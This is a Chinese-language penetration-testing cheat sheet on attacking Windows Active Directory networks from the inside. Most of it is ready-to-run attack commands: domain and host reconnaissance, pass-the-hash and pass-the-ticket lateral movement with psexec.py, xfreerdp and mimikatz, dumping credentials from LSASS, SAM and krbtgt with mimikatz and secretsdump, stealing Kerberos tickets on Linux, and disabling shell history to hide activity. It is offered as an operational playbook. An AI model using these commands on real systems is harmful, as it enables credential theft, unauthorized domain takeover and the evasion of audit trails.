# 内网渗透备忘录



## 信息收集



### 工具推荐

```
https://github.com/AlessandroZ/LaZagne		#内网密码信息收集
https://www.tarlogic.com/blog/how-to-create-keylogger-in-powershell/	#powershell键盘记录器
https://adsecurity.org/?p=1760			#恶意ssp记录登陆密码
```





### 查看当前用户域

```powershell
$env:USERDNSDOMAIN

(Get-WmiObject Win32_ComputerSystem).Domain

Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID
```



### 查看域森信息

```powershell
Get-ADForest
(Get-ADForest).ForestMode #获取森林的功能模式
(Get-ADDomain).DomainMode #获取域的功能模式
```





### 查看域信任

```powershell
 nltest /domain_trusts
```





### 获取用户信息

```powershell
Get-ADUser <username>

Get-ADUser -Filter * | select SamAccountName #查看所有可显用户

Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName	#查看所有用户

Get-ADUser  -LDAPFilter "(SamAccountName=*$)" | select SamAccountName #列出信任用户
```



### 获取组信息



```powershell
Get-ADGroup -Filter * | select SamAccountName #列出域组
Get-ADGroup "<group name>" -Properties members,memberof #列出指定组的成员和其他信息
```



```powershell
#组tips
#DNSAdmins 组可以允许其成员使用任意 DLL 在域控制器中作为 SYSTEM 执行代码。


#Protected Users组允许强制执行帐户的安全性。他们的成员不得：
使用 NTLM 进行身份验证（仅限 Kerberos）
在 Kerberos 预身份验证中使用 DES 或 RC4 加密类型。
使用无约束或约束委派进行委派。
将 Kerberos TGT 更新到超过最初的四小时生命周期。

#Schema Admins 可以修改 Active Directory 数据库架构。

#Account Operators 可以修改域中许多组的成员，但不包括许多管理员组。但是，它可以修改 Server Operators 组。

#Backup Operators的成员可以备份和恢复域控制器中的文件（他们也可以登录到它们）。这可能允许修改域控制器中的文件。

#Print Operators可以登录域控制器。

#Server Operators 可以登录域控制器并管理其配置。

#Remote Desktop Users 的成员可以通过 RDP 登录域控制器。

#Group Policy Creator Owners的成员可以编辑域中的 GPO。

#许多组织添加的自定义组也可能具有很高的特权

#许多软件（尤其是 Microsoft 软件）添加了自己的管理组，例如 Exchange，可以添加特权组（例如 Exchange Windows Permissions），允许用户执行 DCSync 攻击（如果未正确更新）。

```





### 域控发现

```powershell
nslookup -q=srv _ldap._tcp.dc._msdcs.<域名>
nltest /dclist:<域名> #需要有域用户权限
```





```powershell
#类似以下端口必定是域控
$ nmap 192.168.100.2 -Pn -sV -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 11:17 CEST
Nmap scan report for 192.168.100.2
Host is up (0.00068s latency).
Not shown: 65509 filtered ports
PORT      STATE SERVICE       VERSION
42/tcp    open  tcpwrapped
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-04 09:19:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.31 seconds
```



### 获取服务用户用户名

```powershell
Get-WmiObject win32_service -Filter "name='<服务名>'" | select -ExpandProperty startname
```





### 历史记录



#### powershell历史记录

```powershell
(Get-PSReadlineOption).HistorySavePath	#获取当前用户的 Powershell 历史路径。
Get-ChildItem <file dir>				#检查所有用户的 Powershell 历史记录
type <file dir>						#查看历史记录
Set-PSReadlineOption -HistorySaveStyle SaveNothing #禁用powershell历史记录（单次）
```

#### shell history

```shell
history		#查看历史记录
unset HISTFILE #取消记录
```



### 主机发现



#### windows

```powershell
#ldapsearch 需要域用户权限
ldapsearch -H ldap://<ldap server ip> -x -LLL -W -D "<username>@<domain>" -b "dc=<domain:contoso>,dc=<domain:local>" "(objectclass=computer)" "DNSHostName" "OperatingSystem"

#netbios scan
nbtscan <ip subnet>

#通过smb协议扫描 https://github.com/Zer1t0/ntlm-info
#nmap smb-os-discovery script https://nmap.org/nsedoc/scripts/smb-os-discovery.html
ntlm-info smb <ip subnet>

#nmap 扫描特殊端口、 135（RCP）、 139（NetBIOS 会话服务）
```



#### linux

```bash
nmap -sS -p 22 <ip>			#扫描开放22号端口的服务器
```







## 连接/移动

```
#工具推荐
evil-winrm：https://github.com/Hackplayers/evil-winrm
CrackMapExec：https://github.com/byt3bl33d3r/CrackMapExec
```



### RPC/SMB

```powershell
Psexec: https://download.sysinternals.com/files/PSTools.zip
psexec.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
wmiexec.py: https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py

#psexec.py
psexec.py <domain>/<username>@<target ip> -hashes :<nt/lm hash>

#powershell远程连接，Windows Server 2012 R2 起默认启用
#https://docs.microsoft.com/zh-cn/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1

$pw = ConvertTo-SecureString -AsPlainText -Force -String "<password>"
$cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "<dns/netbios>\<username>",$pw
$session = New-PSSession -ComputerName dc01 -Credential $cred
Invoke-Command -Session $session -ScriptBlock {hostname}
Enter-PSSession -Session $session

```


#### SSH

```bash
#连接ssh
ssh -o GSSAPIAuthentication=yes <username>@<domain> -vv
```

#### SSH密钥



查看密钥

```bash
ls -a .ssh/
```



判断ssh密钥类型

```bash
$file .ssh/<filename>
.ssh/id_ed25519: OpenSSH private key
```



连接服务器

```bash
#known_hosts文件中存在使用私钥通过 ssh 连接的机器的主机名，虽然加密，但是可以使用https://github.com/chris408/known_hosts-hashcat破解

$ ssh -i <private key file> <username>@<hostname>
```









#### 使用kerberos key连接目标

```powershell
#PTT
getTGT.py <domain>/<username> -dc-ip <target ip> -hashes :<nt/lm hash>

#connect 
psexec.py <domain>/<username>@<hostname/NetBIOS> -target-ip <target ip> -k -no-pass
使用 Kerberos 身份验证时，您需要将远程机器的主机名（DNS 名称或 NetBIOS 名称）而不是其 IP 作为目标传递给工具。这是因为 Kerberos 身份验证使用主机名来识别远程计算机的服务并提供正确的票证来对其进行身份验证。
```



### RDP

```powershell
#默认情况下无法使用ptt连接RDP，但是在win8.1/2012 R2后，引入了 Restricted Admin 模式(https://docs.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2)，启用该模式可以使用命令行连接RDP

#从linux连接:https://www.kali.org/blog/passing-hash-remote-desktop/
xfreerdp /u:<username>@<domain> /pth:<nt/lm hash> /v:<target ip>

#从windows连接，需要对方在注册表Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa中将DisableRestrictedAdmin设置为0. https://edermi.github.io/post/2018/native_rdp_pass_the_hash/
sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<nt/lm hash> /run:"mstsc.exe /restrictedadmin"

#设置对方注册表，开启Restricted Admin模式
mimikatz.exe "sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt/lm hash> /run:powershell.exe"
Enter-PSSession -Computer <Target ip / dns / hostname>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```





## 利用



### 票证转储

```powershell
#secretsdump.py
secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt

#windows系统默认情况下在 Powershell 中启用并在 CMD 中禁用SeDebugPrivilege	
privilege::debug			#启用 SeDebugPrivilege
sekurlsa::logonpasswords	#提取 NT 哈希和密码
sekurlsa::ekeys				#获取 Kerberos 密钥
sekurlsa::tickets			#检索存储在机器中的 Kerberos 票证
lsadump::secrets			#获取 LSA 机密
lsadump::cache				#检索缓存的域登录
lsadump::sam				#获取本地帐户凭据
```



#### 本地导出LSA secrets 并解密

```powershell
reg save HKLM\SYSTEM system.bin
reg save HKLM\SECURITY security.bin
reg save HKLM\SAM sam.bin

```



#### linux

##### 文件目录

```
/etc/krb5.keytab	#密钥表
echo $KRB5_KTNAME			#环境变量
echo $KRB5_CLIENT_KTNAME 	#环境变量
/etc/krb5.conf		#kerberos配置文件
/tmp/krb5cc_<uid>	#kerberos票证
```



```bash
klist -k -Ke 	#显示票据
```



##### dump 密钥并且转换为文件

```bash
/tmp/tickey -i #https://github.com/TarlogicSecurity/tickey
```





### 票据转换

> 因为linux系统和windows系统使用的票据文件格式不同，所以需要使用工具进行转换

```powershell
ticket_converter:https://github.com/Zer1t0/ticket_converter
cerbero:https://github.com/Zer1t0/cerbero#convert
```

